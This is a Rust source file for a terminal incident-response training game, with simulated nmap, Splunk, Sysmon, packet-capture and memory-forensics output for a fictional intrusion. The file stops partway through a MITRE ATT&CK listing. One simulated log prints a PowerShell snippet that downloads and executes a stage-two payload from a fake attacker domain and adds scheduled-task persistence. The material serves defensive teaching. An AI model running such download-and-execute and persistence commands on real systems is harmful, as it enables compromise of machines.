//! Main application state and rendering

use crate::game::{Game, GamePhase, GameAction};
use crate::data::ExperienceLevel;
use crate::tui::{Theme, styled_block, LOGO, HELP_TEXT, SMALL_LOGO};
use crate::tui::{create_main_layout, create_content_layout, create_main_area_layout};
use crossterm::event::{self, Event, KeyCode, KeyEventKind};
use ratatui::{
    layout::{Alignment, Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{
        Block, Borders, Clear, List, ListItem, ListState, Paragraph, Wrap,
    },
    Frame,
};
use std::time::Duration;

/// Application state
pub struct App {
    pub game: Game,
    pub theme: Theme,
    pub running: bool,
    pub show_help: bool,
    pub current_screen: Screen,
    pub menu_state: ListState,
    pub message_scroll: u16,
    pub input_buffer: String,
    pub selected_panel: Panel,
    pub input_mode: InputMode,
    pub command_history: Vec<String>,
    pub command_output: Vec<String>,
    pub game_mode: GameMode,
    pub red_team_state: RedTeamState,
}

/// Current screen being displayed
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Screen {
    MainMenu,
    ModeSelect,  // Blue Team vs Red Team
    NewGame,
    LoadGame,
    Playing,
    Paused,
    Help,
    Timeline,
    Evidence,
    Systems,
    Interview,
    Report,
    GameOver,
}

/// Input mode for command prompt
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum InputMode {
    Normal,
    Command,  // Typing a command
}

/// Game mode - Blue Team (defender) or Red Team (attacker)
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GameMode {
    BlueTeam,  // Incident responder - investigate and contain
    RedTeam,   // Attacker - infiltrate and exfiltrate
}

/// Red Team attack state
#[derive(Debug, Clone)]
pub struct RedTeamState {
    pub cover_blown: bool,
    pub access_level: u8,           // 0=none, 1=user, 2=local admin, 3=domain admin
    pub compromised_systems: Vec<String>,
    pub harvested_creds: Vec<(String, String)>,  // (user, pass_hash)
    pub exfiltrated_data: Vec<String>,
    pub implants_deployed: Vec<String>,
    pub current_target: Option<String>,
    pub detection_score: u8,        // 0-100, higher = more likely to be caught
    pub attack_stage: RedTeamStage,
    pub tools_available: Vec<String>,
    pub loot: Vec<String>,
}

/// Stages of a red team operation
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RedTeamStage {
    Reconnaissance,     // OSINT, scanning
    WeaponizationDelivery, // Craft payloads, send phishing
    Exploitation,       // Initial access
    Installation,       // Persistence
    CommandAndControl,  // Establish C2
    LateralMovement,    // Move through network
    Exfiltration,       // Steal data
    Complete,           // Mission accomplished
}

impl Default for RedTeamState {
    fn default() -> Self {
        Self {
            cover_blown: false,
            access_level: 0,
            compromised_systems: Vec::new(),
            harvested_creds: Vec::new(),
            exfiltrated_data: Vec::new(),
            implants_deployed: Vec::new(),
            current_target: None,
            detection_score: 0,
            attack_stage: RedTeamStage::Reconnaissance,
            tools_available: vec![
                "nmap".to_string(),
                "phishing_kit".to_string(),
                "mimikatz".to_string(),
                "cobalt_strike".to_string(),
                "bloodhound".to_string(),
            ],
            loot: Vec::new(),
        }
    }
}

impl RedTeamStage {
    pub fn name(&self) -> &'static str {
        match self {
            RedTeamStage::Reconnaissance => "Reconnaissance",
            RedTeamStage::WeaponizationDelivery => "Weaponization & Delivery",
            RedTeamStage::Exploitation => "Exploitation",
            RedTeamStage::Installation => "Installation",
            RedTeamStage::CommandAndControl => "Command & Control",
            RedTeamStage::LateralMovement => "Lateral Movement",
            RedTeamStage::Exfiltration => "Exfiltration",
            RedTeamStage::Complete => "Mission Complete",
        }
    }
}

/// Which panel is selected
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Panel {
    Actions,
    Messages,
    Evidence,
    Systems,
}

impl App {
    pub fn new() -> Self {
        let mut menu_state = ListState::default();
        menu_state.select(Some(0));

        Self {
            game: Game::new("Analyst", ExperienceLevel::JuniorAnalyst),
            theme: Theme::default(),
            running: true,
            show_help: false,
            current_screen: Screen::MainMenu,
            menu_state,
            message_scroll: 0,
            input_buffer: String::new(),
            selected_panel: Panel::Messages,
            input_mode: InputMode::Normal,
            command_history: Vec::new(),
            command_output: vec![
                "[SYSTEM] Welcome. Select your role to begin.".to_string(),
            ],
            game_mode: GameMode::BlueTeam,
            red_team_state: RedTeamState::default(),
        }
    }

    /// Handle keyboard input
    pub fn handle_input(&mut self) -> std::io::Result<bool> {
        if event::poll(Duration::from_millis(100))? {
            if let Event::Key(key) = event::read()? {
                if key.kind != KeyEventKind::Press {
                    return Ok(true);
                }

                // Handle command input mode separately
                if self.input_mode == InputMode::Command {
                    match key.code {
                        KeyCode::Enter => {
                            self.execute_command();
                            self.input_mode = InputMode::Normal;
                        }
                        KeyCode::Esc => {
                            self.input_buffer.clear();
                            self.input_mode = InputMode::Normal;
                        }
                        KeyCode::Backspace => {
                            self.input_buffer.pop();
                        }
                        KeyCode::Char(c) => {
                            self.input_buffer.push(c);
                        }
                        _ => {}
                    }
                    return Ok(true);
                }

                // Normal mode key handling
                match key.code {
                    KeyCode::Char('q') if self.current_screen == Screen::MainMenu => {
                        self.running = false;
                        return Ok(false);
                    }
                    KeyCode::Char('?') => {
                        self.show_help = !self.show_help;
                    }
                    KeyCode::Esc => {
                        if self.show_help {
                            self.show_help = false;
                        } else {
                            self.handle_escape();
                        }
                    }
                    KeyCode::Up => self.navigate_up(),
                    KeyCode::Down => self.navigate_down(),
                    KeyCode::Enter => self.handle_enter(),
                    KeyCode::Tab => self.cycle_panel(),
                    KeyCode::F(1) => self.handle_coffee(),

                    // Action keys - in Playing or Paused screen
                    KeyCode::Char(':') | KeyCode::Char('/') | KeyCode::Char(';')
                        if self.current_screen == Screen::Playing || self.current_screen == Screen::Paused => {
                        // Enter command mode
                        self.input_mode = InputMode::Command;
                        self.input_buffer.clear();
                        self.current_screen = Screen::Playing; // Unpause if paused
                        self.command_output.push("[SYSTEM] Command mode activated. Type your command.".to_string());
                    }
                    KeyCode::Char(' ') if self.current_screen == Screen::Playing => {
                        // Space also enters command mode for convenience
                        self.input_mode = InputMode::Command;
                        self.input_buffer.clear();
                        self.command_output.push("[SYSTEM] Command mode activated. Type your command.".to_string());
                    }
                    KeyCode::Char('e') if self.current_screen == Screen::Playing => {
                        self.handle_examine();
                    }
                    KeyCode::Char('i') if self.current_screen == Screen::Playing => {
                        self.handle_interview();
                    }
                    KeyCode::Char('s') if self.current_screen == Screen::Playing => {
                        self.handle_scan();
                    }
                    KeyCode::Char('c') if self.current_screen == Screen::Playing => {
                        self.handle_contain();
                    }
                    KeyCode::Char('t') if self.current_screen == Screen::Playing => {
                        self.current_screen = Screen::Timeline;
                        self.command_output.push("[ACTION] Viewing timeline...".to_string());
                    }
                    KeyCode::Char('n') if self.current_screen == Screen::Playing => {
                        self.handle_add_note();
                    }
                    KeyCode::Char('r') if self.current_screen == Screen::Playing => {
                        self.handle_report();
                    }
                    KeyCode::Char('h') if self.current_screen == Screen::Playing => {
                        // Quick help
                        let help_output = self.process_command("help");
                        for line in help_output {
                            self.command_output.push(line);
                        }
                    }
                    _ => {}
                }
            }
        }
        Ok(true)
    }

    /// Execute a typed command
    fn execute_command(&mut self) {
        let cmd = self.input_buffer.trim().to_lowercase();
        self.command_history.push(self.input_buffer.clone());

        let output = self.process_command(&cmd);
        for line in output {
            self.command_output.push(line);
        }

        // Keep output buffer manageable
        while self.command_output.len() > 100 {
            self.command_output.remove(0);
        }

        self.input_buffer.clear();
    }

    /// Process a command and return output lines
    fn process_command(&mut self, cmd: &str) -> Vec<String> {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.is_empty() {
            return vec![];
        }

        // Red Team specific commands
        if self.game_mode == GameMode::RedTeam {
            return self.process_red_team_command(&parts);
        }

        match parts[0] {
            "help" | "?" => vec![
                "╔══════════════════════════════════════════════════════════════╗".to_string(),
                "║              🛡️  BLUE TEAM COMMANDS                          ║".to_string(),
                "╠══════════════════════════════════════════════════════════════╣".to_string(),
                "║  INVESTIGATION:                                              ║".to_string(),
                "║    scan <system>      - Scan a system for compromise         ║".to_string(),
                "║    nmap <target>      - Run nmap scan on target              ║".to_string(),
                "║    contain <system>   - Isolate a system from network        ║".to_string(),
                "║    analyze <evidence> - Analyze a piece of evidence          ║".to_string(),
                "║    interview <name>   - Interview an employee                ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  FORENSICS:                                                  ║".to_string(),
                "║    splunk <query>     - Query SIEM (auth/network/process/..) ║".to_string(),
                "║    ps / processes     - List running processes               ║".to_string(),
                "║    netstat            - Show network connections             ║".to_string(),
                "║    pcap / wireshark   - Analyze packet capture               ║".to_string(),
                "║    eventlog <type>    - View Windows event logs              ║".to_string(),
                "║    mem / memory       - Memory forensics analysis            ║".to_string(),
                "║    hash <sha256>      - VirusTotal hash lookup               ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  REPORTING:                                                  ║".to_string(),
                "║    status             - Show current incident status         ║".to_string(),
                "║    systems            - List all systems                     ║".to_string(),
                "║    evidence           - List collected evidence              ║".to_string(),
                "║    timeline           - Show incident timeline               ║".to_string(),
                "║    iocs               - List indicators of compromise        ║".to_string(),
                "║    mitre              - Show MITRE ATT&CK mapping            ║".to_string(),
                "║    note <text>        - Add investigation note               ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  OTHER:                                                      ║".to_string(),
                "║    coffee             - Take a coffee break ☕               ║".to_string(),
                "║    score              - View current score and grade         ║".to_string(),
                "║    achievements       - View unlocked achievements           ║".to_string(),
                "║    clear              - Clear terminal output                ║".to_string(),
                "╚══════════════════════════════════════════════════════════════╝".to_string(),
            ],

            "clear" | "cls" => {
                self.command_output.clear();
                vec!["[SYSTEM] Terminal cleared.".to_string()]
            }

            "status" => {
                let player = &self.game.player;
                let phase = format!("{:?}", self.game.phase);
                vec![
                    "┌─────────────────────────────────────┐".to_string(),
                    "│         INCIDENT STATUS             │".to_string(),
                    "├─────────────────────────────────────┤".to_string(),
                    format!("│ Phase: {:<27} │", phase),
                    format!("│ Energy: {:<26} │", format!("{}%", player.energy)),
                    format!("│ Stress: {:<26} │", format!("{}%", player.stress)),
                    format!("│ Coffee consumed: {:<17} │", player.coffee_consumed),
                    "└─────────────────────────────────────┘".to_string(),
                ]
            }

            "systems" | "hosts" => {
                let mut output = vec![
                    "[SYSTEM] Known systems:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                ];
                if let Some(scenario) = &self.game.scenario {
                    for sys in &scenario.systems {
                        let status = format!("{:?}", sys.compromise_status);
                        output.push(format!(
                            "  {} {} ({}) - {} [{}]",
                            sys.system_type.icon(),
                            sys.hostname,
                            sys.ip_address,
                            sys.owner,
                            status
                        ));
                    }
                }
                output
            }

            "scan" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: scan <hostname or IP>".to_string()];
                }
                let target = parts[1];
                self.game.player.use_energy(10);
                self.game.player.add_stress(5);
                vec![
                    format!("[SCAN] Initiating scan of {}...", target),
                    "[SCAN] Checking running processes...".to_string(),
                    "[SCAN] Analyzing network connections...".to_string(),
                    "[SCAN] Reviewing scheduled tasks...".to_string(),
                    "[SCAN] Examining startup items...".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    format!("[RESULT] Scan of {} complete.", target),
                    "[FINDING] Suspicious PowerShell execution detected".to_string(),
                    "[FINDING] Unusual outbound connection to 185.234.xx.xx:443".to_string(),
                    "[FINDING] New scheduled task: 'WindowsUpdate' (suspicious)".to_string(),
                    "[IOC] Added: 185.234.xx.xx to indicators".to_string(),
                ]
            }

            // Realistic nmap output
            "nmap" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: nmap <target>".to_string(),
                        "[TIP] Example: nmap 10.0.5.42".to_string(),
                    ];
                }
                self.game.player.use_energy(15);
                let target = parts[1];
                let is_compromised = target.contains("42") || target.contains("jsmith");

                let mut output = vec![
                    format!("Starting Nmap 7.94 ( https://nmap.org )"),
                    format!("Nmap scan report for {}", target),
                    format!("Host is up (0.0023s latency)."),
                    "".to_string(),
                    "PORT      STATE    SERVICE       VERSION".to_string(),
                    "22/tcp    filtered ssh".to_string(),
                    "135/tcp   open     msrpc         Microsoft Windows RPC".to_string(),
                    "139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn".to_string(),
                    "445/tcp   open     microsoft-ds  Windows 10 Pro 19045 microsoft-ds".to_string(),
                    "3389/tcp  open     ms-wbt-server Microsoft Terminal Services".to_string(),
                    "5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)".to_string(),
                ];

                if is_compromised {
                    output.push("8443/tcp  open     https-alt     UNKNOWN".to_string());
                    output.push("".to_string());
                    output.push("[!] SUSPICIOUS: Port 8443 is non-standard HTTPS".to_string());
                    output.push("[!] SUSPICIOUS: Could be C2 callback channel".to_string());
                    output.push("[IOC] Added: Suspicious port 8443 to indicators".to_string());
                }

                output.push("".to_string());
                output.push("Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows".to_string());
                output.push("".to_string());
                output.push("Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds".to_string());
                output
            }

            // Realistic Splunk queries
            "splunk" | "spl" => {
                if parts.len() < 2 {
                    return vec![
                        "[SPLUNK] Usage: splunk <query_type>".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[QUERIES] Available queries:".to_string(),
                        "  splunk auth     - Failed authentication attempts".to_string(),
                        "  splunk network  - Suspicious network connections".to_string(),
                        "  splunk process  - Process creation events".to_string(),
                        "  splunk dns      - DNS query logs".to_string(),
                        "  splunk powershell - PowerShell execution logs".to_string(),
                        "  splunk lateral  - Lateral movement indicators".to_string(),
                    ];
                }
                self.game.player.use_energy(10);

                match parts[1].to_lowercase().as_str() {
                    "auth" | "authentication" => vec![
                        "[SPLUNK] index=windows sourcetype=WinEventLog:Security EventCode=4625".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "Time            Host         User          Source IP      Reason".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "08:41:23  SRV-DC01      jsmith        10.0.5.42      Bad password".to_string(),
                        "08:41:24  SRV-DC01      jsmith        10.0.5.42      Bad password".to_string(),
                        "08:41:25  SRV-DC01      jsmith        10.0.5.42      Bad password".to_string(),
                        "08:52:11  SRV-DC01      svc_backup    10.0.5.42      Success (4624)".to_string(),
                        "08:52:12  SRV-FS01      svc_backup    10.0.5.42      Success (4624)".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] Multiple failed logins followed by success".to_string(),
                        "[FINDING] svc_backup used from workstation - UNUSUAL!".to_string(),
                        "[IOC] Service account used interactively".to_string(),
                    ],
                    "network" | "netflow" => vec![
                        "[SPLUNK] index=network sourcetype=firewall action=allow".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "Time       Src IP       Src Port  Dst IP          Dst Port  Bytes".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "08:47:01  10.0.5.42     49152    185.234.72.19   443      1.2KB".to_string(),
                        "08:47:31  10.0.5.42     49152    185.234.72.19   443      256B".to_string(),
                        "08:48:01  10.0.5.42     49152    185.234.72.19   443      256B".to_string(),
                        "08:48:31  10.0.5.42     49152    185.234.72.19   443      256B".to_string(),
                        "08:49:01  10.0.5.42     49152    185.234.72.19   443      512B".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] Regular 30-second beaconing pattern detected!".to_string(),
                        "[FINDING] Small, consistent packet sizes = C2 heartbeat".to_string(),
                        "[IOC] C2 IP: 185.234.72.19 (DigitalOcean VPS)".to_string(),
                    ],
                    "process" | "proc" => vec![
                        "[SPLUNK] index=windows sourcetype=WinEventLog:Sysmon EventCode=1".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "Time       Host       Parent              Process         CLI".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "08:46:12  WS-JSMITH  EXCEL.EXE           powershell.exe  -enc aQBlAHgA...".to_string(),
                        "08:46:14  WS-JSMITH  powershell.exe      cmd.exe         /c whoami".to_string(),
                        "08:46:15  WS-JSMITH  cmd.exe             whoami.exe      ".to_string(),
                        "08:46:18  WS-JSMITH  powershell.exe      rundll32.exe    C:\\Users\\...".to_string(),
                        "08:52:03  WS-JSMITH  powershell.exe      mimikatz.exe    sekurlsa::".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] ⚠ EXCEL spawned PowerShell - MACRO EXECUTION!".to_string(),
                        "[FINDING] ⚠ Base64 encoded PowerShell command".to_string(),
                        "[FINDING] ⚠ MIMIKATZ DETECTED! Credential theft!".to_string(),
                        "[MITRE] T1059.001 (PowerShell), T1003 (Credential Dumping)".to_string(),
                    ],
                    "dns" => vec![
                        "[SPLUNK] index=dns sourcetype=stream:dns".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "Time       Client        Query                     Type  Response".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "08:46:58  10.0.5.42     update-service.xyz        A     185.234.72.19".to_string(),
                        "08:47:01  10.0.5.42     aGVsbG8.update-service.xyz TXT  NOERROR".to_string(),
                        "08:48:01  10.0.5.42     d29ybGQ.update-service.xyz TXT  NOERROR".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] ⚠ DNS tunneling detected!".to_string(),
                        "[FINDING] Base64-like subdomains suggest data exfil".to_string(),
                        "[IOC] Malicious domain: update-service.xyz".to_string(),
                    ],
                    "powershell" | "ps" => vec![
                        "[SPLUNK] index=windows sourcetype=WinEventLog:PowerShell EventCode=4104".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[DECODED SCRIPT BLOCK]".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "$wc = New-Object System.Net.WebClient".to_string(),
                        "$wc.Headers.Add('User-Agent','Mozilla/5.0')".to_string(),
                        "$payload = $wc.DownloadString('https://update-service.xyz/stage2')".to_string(),
                        "IEX($payload)".to_string(),
                        "".to_string(),
                        "# Stage 2 - Persistence".to_string(),
                        "$task = New-ScheduledTask -Action (New-ScheduledTaskAction \\".to_string(),
                        "  -Execute 'powershell.exe' -Argument '-w hidden -enc ...')".to_string(),
                        "Register-ScheduledTask -TaskName 'WindowsUpdate' -InputObject $task".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] ⚠ MALICIOUS POWERSHELL SCRIPT!".to_string(),
                        "[FINDING] Downloads and executes remote code".to_string(),
                        "[FINDING] Creates persistence via scheduled task".to_string(),
                        "[MITRE] T1059.001, T1053.005, T1071.001".to_string(),
                    ],
                    "lateral" => vec![
                        "[SPLUNK] index=windows (EventCode=4648 OR EventCode=4624 LogonType=3)".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "Time       Src Host      Account      Dst Host     Logon".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "08:52:11  WS-JSMITH     svc_backup   SRV-DC01     Network".to_string(),
                        "08:52:12  WS-JSMITH     svc_backup   SRV-FS01     Network".to_string(),
                        "08:53:45  SRV-FS01      Administrator SRV-DC01    Network".to_string(),
                        "═════════════════════════════════════════════════════════════════".to_string(),
                        "[FINDING] ⚠ Service account pivot from workstation!".to_string(),
                        "[FINDING] ⚠ Lateral movement to file server and DC".to_string(),
                        "[MITRE] T1021 (Remote Services), T1078 (Valid Accounts)".to_string(),
                    ],
                    _ => vec![
                        format!("[ERROR] Unknown query type: {}", parts[1]),
                        "[TIP] Try: auth, network, process, dns, powershell, lateral".to_string(),
                    ],
                }
            }

            // Process listing (like ps)
            "ps" | "processes" | "tasklist" => {
                self.game.player.use_energy(5);
                vec![
                    "[PROCESS] Process listing for WS-JSMITH:".to_string(),
                    "─────────────────────────────────────────────────────────────────────".to_string(),
                    "PID    PPID   User            CPU  Mem     Process".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "4      0      SYSTEM          0.0  0.1MB   System".to_string(),
                    "672    4      SYSTEM          0.1  2.1MB   smss.exe".to_string(),
                    "784    672    SYSTEM          0.3  5.2MB   csrss.exe".to_string(),
                    "892    672    SYSTEM          0.1  3.8MB   wininit.exe".to_string(),
                    "2156   1      jsmith          2.1  45MB    explorer.exe".to_string(),
                    "3421   2156   jsmith          0.5  32MB    chrome.exe".to_string(),
                    "4892   2156   jsmith          8.2  180MB   EXCEL.EXE".to_string(),
                    "5123   4892   jsmith          3.4  85MB    powershell.exe  ⚠".to_string(),
                    "5456   5123   jsmith          0.1  12MB    cmd.exe         ⚠".to_string(),
                    "5789   5123   jsmith          1.2  45MB    rundll32.exe    ⚠".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[FINDING] ⚠ EXCEL.EXE spawned powershell.exe - SUSPICIOUS!".to_string(),
                    "[FINDING] ⚠ rundll32.exe running from user context".to_string(),
                    "[TIP] Use 'proc <PID>' for detailed process info".to_string(),
                ]
            }

            // Network connections (netstat)
            "netstat" | "connections" | "conns" => {
                self.game.player.use_energy(5);
                vec![
                    "[NETSTAT] Active connections on WS-JSMITH:".to_string(),
                    "─────────────────────────────────────────────────────────────────────".to_string(),
                    "Proto  Local Address        Foreign Address        State       PID".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "TCP    10.0.5.42:49152      185.234.72.19:443     ESTABLISHED  5789 ⚠".to_string(),
                    "TCP    10.0.5.42:49153      13.107.42.14:443      ESTABLISHED  3421".to_string(),
                    "TCP    10.0.5.42:49154      172.217.14.99:443     ESTABLISHED  3421".to_string(),
                    "TCP    10.0.5.42:49155      10.0.5.1:445          ESTABLISHED  4".to_string(),
                    "TCP    10.0.5.42:49156      10.0.5.10:5985        ESTABLISHED  5123 ⚠".to_string(),
                    "UDP    10.0.5.42:137        *:*                                4".to_string(),
                    "UDP    10.0.5.42:138        *:*                                4".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[FINDING] ⚠ Connection to 185.234.72.19:443 (Unknown external IP)".to_string(),
                    "[FINDING] ⚠ WinRM connection to 10.0.5.10 (IT Manager workstation)".to_string(),
                    "[IOC] Suspicious external connection from rundll32.exe".to_string(),
                ]
            }

            // Wireshark-style packet capture
            "pcap" | "wireshark" | "packets" => {
                self.game.player.use_energy(15);
                self.game.player.add_stress(5);
                vec![
                    "[PCAP] Packet capture from WS-JSMITH (last 60 seconds):".to_string(),
                    "─────────────────────────────────────────────────────────────────────".to_string(),
                    "No.  Time       Source          Dest            Proto  Info".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "1    0.000000   10.0.5.42       185.234.72.19   TLSv1.2  Client Hello".to_string(),
                    "2    0.023451   185.234.72.19   10.0.5.42       TLSv1.2  Server Hello".to_string(),
                    "3    0.045123   10.0.5.42       185.234.72.19   TLSv1.2  Certificate".to_string(),
                    "4    0.067234   185.234.72.19   10.0.5.42       TLSv1.2  Application Data [256 bytes]".to_string(),
                    "5    30.001234  10.0.5.42       185.234.72.19   TLSv1.2  Application Data [64 bytes]".to_string(),
                    "6    30.023456  185.234.72.19   10.0.5.42       TLSv1.2  Application Data [256 bytes]".to_string(),
                    "7    60.001234  10.0.5.42       185.234.72.19   TLSv1.2  Application Data [64 bytes]".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[ANALYSIS] TLS Certificate Analysis:".to_string(),
                    "  Subject: CN=update-service.xyz".to_string(),
                    "  Issuer: Let's Encrypt Authority X3".to_string(),
                    "  Not Before: 2024-01-10".to_string(),
                    "  JA3 Hash: 771,49196-49195-49200,0-5-10-11-16-21,23-24,0".to_string(),
                    "".to_string(),
                    "[FINDING] ⚠ 30-second beacon interval detected!".to_string(),
                    "[FINDING] ⚠ JA3 hash matches known Cobalt Strike profile".to_string(),
                    "[IOC] JA3 hash added to indicators".to_string(),
                ]
            }

            // Windows Event Logs
            "eventlog" | "events" | "evtx" => {
                if parts.len() < 2 {
                    return vec![
                        "[EVENTLOG] Usage: eventlog <type>".to_string(),
                        "  Types: security, system, powershell, sysmon".to_string(),
                    ];
                }
                self.game.player.use_energy(10);

                match parts[1].to_lowercase().as_str() {
                    "security" => vec![
                        "[EVENTLOG] Windows Security Log (WS-JSMITH):".to_string(),
                        "─────────────────────────────────────────────────────────────────────".to_string(),
                        "EventID  Time       Category        Description".to_string(),
                        "═══════════════════════════════════════════════════════════════════".to_string(),
                        "4688     08:46:12   Process Create  powershell.exe created by EXCEL.EXE".to_string(),
                        "4688     08:46:14   Process Create  cmd.exe created by powershell.exe".to_string(),
                        "4688     08:46:18   Process Create  rundll32.exe".to_string(),
                        "4648     08:52:03   Explicit Creds  svc_backup credentials used".to_string(),
                        "4624     08:52:11   Logon           Network logon to SRV-DC01".to_string(),
                        "4624     08:52:12   Logon           Network logon to SRV-FS01".to_string(),
                        "═══════════════════════════════════════════════════════════════════".to_string(),
                        "".to_string(),
                        "[FINDING] Process creation chain indicates macro execution".to_string(),
                        "[FINDING] Explicit credential use suggests credential theft".to_string(),
                    ],
                    "sysmon" => vec![
                        "[EVENTLOG] Sysmon Log (WS-JSMITH):".to_string(),
                        "─────────────────────────────────────────────────────────────────────".to_string(),
                        "EID  Time       Event                Details".to_string(),
                        "═══════════════════════════════════════════════════════════════════".to_string(),
                        "1    08:46:12   ProcessCreate        powershell.exe -enc aQBlAHgA...".to_string(),
                        "3    08:47:01   NetworkConnect       10.0.5.42 -> 185.234.72.19:443".to_string(),
                        "7    08:46:18   ImageLoad            C:\\Windows\\System32\\wshtcpip.dll".to_string(),
                        "11   08:47:05   FileCreate           C:\\Users\\jsmith\\AppData\\Local\\Temp\\~DF12.tmp".to_string(),
                        "13   08:47:10   RegistryValueSet     HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
                        "═══════════════════════════════════════════════════════════════════".to_string(),
                        "".to_string(),
                        "[FINDING] ⚠ Registry persistence mechanism added!".to_string(),
                        "[FINDING] ⚠ Encoded PowerShell execution".to_string(),
                        "[MITRE] T1547.001 (Registry Run Keys)".to_string(),
                    ],
                    _ => vec![
                        format!("[ERROR] Unknown event log type: {}", parts[1]),
                        "[TIP] Try: security, system, powershell, sysmon".to_string(),
                    ],
                }
            }

            // Memory analysis (volatility-style)
            "mem" | "memory" | "volatility" => {
                self.game.player.use_energy(20);
                self.game.player.add_stress(10);
                vec![
                    "[MEMORY] Memory analysis of WS-JSMITH:".to_string(),
                    "─────────────────────────────────────────────────────────────────────".to_string(),
                    "[malfind] Suspicious memory regions:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "Process: rundll32.exe (PID: 5789)".to_string(),
                    "  VAD: 0x7ff640000000 - 0x7ff640010000".to_string(),
                    "  Protection: PAGE_EXECUTE_READWRITE  ⚠".to_string(),
                    "  Flags: MEM_COMMIT | MEM_RESERVE".to_string(),
                    "".to_string(),
                    "[HEXDUMP]".to_string(),
                    "0x7ff640000000  4d 5a 90 00 03 00 00 00  MZ......".to_string(),
                    "0x7ff640000008  04 00 00 00 ff ff 00 00  ........".to_string(),
                    "0x7ff640000010  b8 00 00 00 00 00 00 00  ........".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[FINDING] ⚠ MZ header in RWX memory - INJECTED PE!".to_string(),
                    "[FINDING] ⚠ Reflective DLL injection detected".to_string(),
                    "[FINDING] Process hollowing or injection technique used".to_string(),
                    "[MITRE] T1055 (Process Injection)".to_string(),
                ]
            }

            // Hash lookup
            "hash" | "virustotal" | "vt" => {
                if parts.len() < 2 {
                    return vec![
                        "[HASH] Usage: hash <sha256>".to_string(),
                        "[TIP] Get hashes from 'analyze' command".to_string(),
                    ];
                }
                self.game.player.use_energy(5);
                vec![
                    format!("[HASH] Looking up: {}...", parts[1]),
                    "─────────────────────────────────────────────────────────────────────".to_string(),
                    "[VIRUSTOTAL] Results:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "  Detection: 47/72 (65.3%) ⚠ MALICIOUS".to_string(),
                    "  First Seen: 2024-01-08".to_string(),
                    "  File Type: Win32 DLL".to_string(),
                    "  File Size: 245,760 bytes".to_string(),
                    "".to_string(),
                    "[DETECTIONS]".to_string(),
                    "  Microsoft    : Trojan:Win32/QakBot.RA!MTB".to_string(),
                    "  CrowdStrike  : Win/malicious_confidence_100%".to_string(),
                    "  Kaspersky    : Trojan-Banker.Win32.QakBot.gen".to_string(),
                    "  Sophos       : Mal/Qbot-A".to_string(),
                    "  SentinelOne  : DFI - Suspicious PE".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[FINDING] Known malware: QakBot banking trojan".to_string(),
                    "[FINDING] First seen 3 weeks ago - recent campaign".to_string(),
                    "[IOC] Hash confirmed malicious".to_string(),
                ]
            }

            // MITRE ATT&CK mapping
            "mitre" | "attack" | "ttps" => {
                vec![
                    "[MITRE] ATT&CK Techniques Identified:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "INITIAL ACCESS:".to_string(),
                    "  T1566.001 - Phishing: Spearphishing Attachment ✓".to_string(),
                    "".to_string(),
                    "EXECUTION:".to_string(),
                    "  T1204.002 - User Execution: Malicious File ✓".to_string(),
                    "  T1059.001 - Command and Scripting: PowerShell ✓".to_string(),
                    "  T1059.003 - Command and Scripting: Windows Command Shell ✓".to_string(),
                    "".to_string(),
                    "PERSISTENCE:".to_string(),
                    "  T1547.001 - Registry Run Keys / Startup Folder ✓".to_string(),
                    "  T1053.005 - Scheduled Task ✓".to_string(),
                    "".to_string(),
                    "CREDENTIAL ACCESS:".to_string(),
